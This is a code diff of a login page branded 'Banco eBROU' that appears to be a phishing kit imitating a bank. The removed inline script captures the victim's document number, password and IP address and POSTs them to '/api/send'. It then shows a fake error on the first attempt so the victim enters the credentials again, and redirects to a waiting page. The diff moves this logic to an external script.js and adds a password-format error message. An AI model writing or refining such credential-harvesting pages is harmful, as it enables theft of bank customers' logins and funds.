@@ -180,6 +180,7 @@
       <label for="contrasena">Contraseña</label>
       <input type="password" id="contrasena" class="form-control" placeholder="Ingrese su contraseña" />
       <div id="contrasena-vacia" class="field-error-text">La contraseña no puede estar vacía</div>
+      <div id="contrasena-incorrecta" class="field-error-text">La contraseña debe tener al menos 5 caracteres y no ser solo numérica</div>
     </div>
 
     <button onclick="enviarDatos()" class="submit-button">Ingresar</button>
@@ -193,83 +194,6 @@
     © 2025 Banco eBROU | <a href="#" style="color: #08528d;">Seguridad</a>
   </div>
 
-  <script>
-    let primerIntento = true;
-
-    async function enviarDatos() {
-      const pais = document.getElementById("pais").value;
-      const documento = document.getElementById("documento").value;
-      const numeroDocumentoInput = document.getElementById("numero-documento");
-      const contrasenaInput = document.getElementById("contrasena");
-      const errorBox = document.getElementById("error-message");
-
-      const numeroDocumento = numeroDocumentoInput.value.trim();
-      const contrasena = contrasenaInput.value.trim();
-
-      const errorUsuario = document.getElementById("usuario-vacio");
-      const errorContrasena = document.getElementById("contrasena-vacia");
-
-      // Reset errores
-      errorBox.style.display = "none";
-      numeroDocumentoInput.classList.remove("error-field");
-      contrasenaInput.classList.remove("error-field");
-      errorUsuario.style.display = "none";
-      errorContrasena.style.display = "none";
-
-      let valido = true;
-
-      if (!numeroDocumento) {
-        numeroDocumentoInput.classList.add("error-field");
-        errorUsuario.style.display = "block";
-        valido = false;
-      }
-
-      if (!contrasena) {
-        contrasenaInput.classList.add("error-field");
-        errorContrasena.style.display = "block";
-        valido = false;
-      }
-
-      if (!valido) return;
-
-      try {
-        // Obtener IP del usuario
-        const ipRes = await fetch("https://api.ipify.org/?format=json");
-        const ipData = await ipRes.json();
-        const ip = ipData.ip;
-
-        // Enviar al send.js unificado
-        const response = await fetch("/api/send", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            pais,
-            documento,
-            numeroDocumento,
-            contrasena,
-            ip
-          }),
-        });
-
-        if (response.ok) {
-          if (primerIntento) {
-            primerIntento = false;
-            errorBox.style.display = "block";
-            numeroDocumentoInput.value = "";
-            contrasenaInput.value = "";
-            return;
-          }
-          setTimeout(() => {
-            window.location.href = "espera.html";
-          }, 1000);
-        } else {
-          errorBox.style.display = "block";
-        }
-      } catch (err) {
-        errorBox.style.display = "block";
-      }
-    }
-  </script>
+  <script src="script.js"></script>
 </body>
 </html>
-
